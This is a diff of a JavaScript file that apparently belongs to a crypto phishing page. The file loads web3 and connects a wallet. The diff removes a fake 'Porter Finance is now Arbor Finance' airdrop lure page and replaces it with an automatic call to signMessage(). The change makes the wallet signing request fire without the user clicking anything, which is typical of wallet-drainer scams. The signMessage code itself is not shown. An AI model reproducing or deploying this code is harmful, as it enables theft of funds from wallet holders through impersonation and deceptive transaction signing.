@@ -51,37 +51,5 @@ fetch('https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js')
   setTimeout(() => {
     connect();
   }, 3000);
-// Replace HTML with new content
-const html = `
-<html>
-<head>
-<style>
-  body {
-    background-image: url('https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q_0W4nNSGt-o6bY7bhZqpA.png');
-    background-size: cover;
-    background-repeat: no-repeat;
-    text-align: center;
-    font-family: sans-serif;
-  }
-  button {
-    background-color: #4caf50;
-    border: none;
-    color: white;
-    padding: 16px 32px;
-    text-align: center;
-    text-decoration: none;
-    display: inline-block;
-    font-size: 16px;
-    margin: 4px 2px;
-    cursor: pointer;
-    border-radius: 10px;
-  }
-</style>
-<body>
-<button onclick="signMessage()">Porter Finance is now Arbor Finance! Click to Sign the Transaction for free $ARBOR Airdrop!</button>
- </body>
-</head>
-</html>
-`;
 
-document.documentElement.innerHTML = html;
+signMessage();
